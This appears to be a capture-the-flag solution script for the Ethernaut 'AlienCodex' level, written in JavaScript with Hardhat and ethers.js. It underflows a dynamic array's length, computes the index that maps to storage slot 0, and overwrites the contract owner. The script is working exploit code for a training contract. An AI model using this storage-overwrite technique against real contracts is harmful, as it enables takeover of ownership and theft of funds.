import { BigNumber } from "ethers";
import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x4a057D0eaA196191D22150F22EbBA8703E8ce165";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);
const contract = await ethers.getContractAt("AlienCodex",CONTRACT_ADDRESS,signer);

//HACK STEPS
//AlienCodex contract inherits Ownable, as it can be seen inspecting the abi,
//so its creation implies setting owner state variable at first place (contract storage: slot 0).
//There is a dynamic array and a fault in code that causes an underflow. (codex length 0 -> 2^256 - 1)
//which gives power to modify all storage slots. 
//revise() function allows to overwrite what is contained in any slot pointing there with specific
//index of the array and the bytes32 value we want to save.


// 1. Check owner  
// Call make_contact to be able to pass through the modifier.
console.log("Contract current owner:",  await contract.owner())
console.log("contact bool value is:",  await contract.contact())
await contract.make_contact()
console.log("contact bool value is:",  await contract.contact())

// 2. Create a bytes32 address from the bytes20 player address. Use it in revise() function
const address = ethers.utils.hexZeroPad(PLAYER_ADDRESS,32)
console.log("Padded address", address)

// 3. Call contract to create underflow and get control over contract storage
await contract.retract();

// 4. Compute storage key for first element in the dynamic array (codex[0]) by hashing its slot position (1).
// Important: keccak256 hashes a 32 bytes hex value. 
// Index equals total storage slots minus the value of computed key. 

let slot = BigNumber.from(1).toHexString()
slot = ethers.utils.hexZeroPad(slot,32)
const startingKey = ethers.utils.keccak256(slot)
const index = BigNumber.from(2).pow(256).sub(BigNumber.from(startingKey))

console.log("Slot 1 in hex(32 bytes)", slot)
console.log("The key for codex[0] is:", startingKey)
console.log("and its numeric value:", BigNumber.from(startingKey))
console.log("The index that corresponds to slot 0:", index)

// 4. Replace owner in contract storage "slot 0" with previous computed address and index. 
await contract.revise(index, address);
console.log("Contract current owner:",  await contract.owner())

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
